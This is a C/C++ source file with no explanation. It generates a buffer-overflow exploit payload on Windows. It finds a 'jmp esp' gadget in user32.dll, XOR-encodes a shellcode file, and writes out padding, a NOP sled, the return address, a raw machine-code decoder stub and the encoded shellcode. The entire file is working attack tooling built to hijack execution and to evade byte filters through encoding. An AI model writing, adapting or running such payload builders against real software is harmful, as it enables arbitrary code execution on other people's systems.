#include <windows.h>
#define DLL_NAME "user32.dll"

int GetAddress()
{
	BYTE *ptr;
	int position,address;
	HINSTANCE handle;
	BOOL done_flag=FALSE;
	handle=LoadLibrary(DLL_NAME);
	if(!handle)
	{
		printf("load dll error");
		return 0;
	}
	ptr=(BYTE *)handle;
	for(position=0;!done_flag;position++)
	{
		try
		{
			if(ptr[position]==0xFF &&ptr[position+1]==0xE4)
			{
				int address=(int)ptr+position;
				return address;				
			}			
		}
		catch(...)
		{
		int address=(int)ptr+position;
		printf("END OF 0x%x\n",address);
		done_flag=true;
		}
	}
	return 0;
}
size_t GetSize(char * szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}
unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;		
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}
int main(int argc, char* argv[])
{
	char *szFilePath="c:\\test\\shellcode.bin";
	char *szFilePath2="c:\\test\\shellcode2.bin";
	unsigned char *BinData = NULL;
	size_t size = 0;	
	BinData = ReadBinaryFile(szFilePath, &size);

	for(int i=0;i<size;i++)
	{
		BinData[i]=BinData[i]^0x44;
	}

	FILE* f = NULL;	
	f = fopen(szFilePath2, "wb");
	if (f == NULL)
	{
		printf("Create error\n");
		return 0;
	}
	
	char filler[]="\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31";
	char nop[]="\x90\x90\x90\x90\x90\x90\x90\x90";
	char decode[]="\x81\xC7\x11\x11\x11\x11\x81\xEF\xA1\x19\x11\x11\x8B\xC7\x83\xC0\x5A\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1";
	char end[]="\xD5";
	fwrite(filler,sizeof(filler)-1,1,f);
	fwrite(nop,sizeof(nop)-1,1,f);

	int address = GetAddress();
	unsigned char *jmpesp=(unsigned char *)&address;
	
	fwrite(jmpesp,4,1,f);
	fwrite(decode,sizeof(decode)-1,1,f);
	fwrite(BinData,size,1,f);
	fwrite(end,1,1,f);
	fclose(f);

	return 0;
}
